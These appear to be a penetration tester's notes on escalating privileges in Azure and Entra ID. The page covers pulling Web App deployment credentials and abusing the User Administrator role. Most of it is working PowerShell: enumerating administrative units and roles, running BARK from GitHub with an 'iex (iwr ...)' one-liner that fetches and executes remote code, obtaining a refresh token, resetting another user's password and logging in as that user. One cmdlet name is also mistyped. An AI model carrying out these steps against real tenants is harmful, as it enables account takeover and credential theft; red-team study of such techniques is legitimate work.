

### **Website Contributors**
---
- Access to the web apps publishing profile & SCM/Kudu (env vars, ssh)
- Retrieve the FTPS deployment URL, username and password

[[azure_webapps#Kudu / SCM]]

### User Administrator
---
- typical for Help Desk and stuff

**Enumerate**
```powershell
Connect-MgGraph
```

List admin units to identify a high privilege target
```powershell
Get-MgDirectoryAdministrativeUnit | fl
```

Check if that Administrative Unit has scopes roles
```powershell
Get-MgBetaDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId
<AUID> | Select-Object roleMemberInfo,roleId  -ExpandProperty roleMemberInfo
```

Resolve the roleID
```powershell
$roleId = "<ID>"
$directoryRoles = GetMgDirectoryRole | Where-Object { $_.Id -eq $roleId }
$directoryRoles | Format-List *
```

If you have *User Administrator* you can reset the password of users.

Now you know the role, grab members of that administrative unit
```powershell
Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId <ID> | Select * -ExpandProperty additionalProperties
```

Reset the password:
https://github.com/BloodHoundAD/BARK

Get BARK
```powershell
iex (iwr https://raw.githubusercontent.com/BloodHoundAD/BARK/main/BARK.ps1)
```

Get refresh token
```powershell
$RefreshToken = Get-EntraRefreshTokenWithUsernamePassword -username "User1@domain.com" -password "passpass" -TenantID "<tenantid>"
```

Set the password with BARK
```powershell
Set-EntraUserPassword -TargetUserId 'user2@domain.com' -Token $RefreshToken.access_token -Password '<new_password>'
```
Will return `204 no content` - this is chill

Login as user
```powershell
az login -u 'user2@domain.com' -p 'newpassword'
```

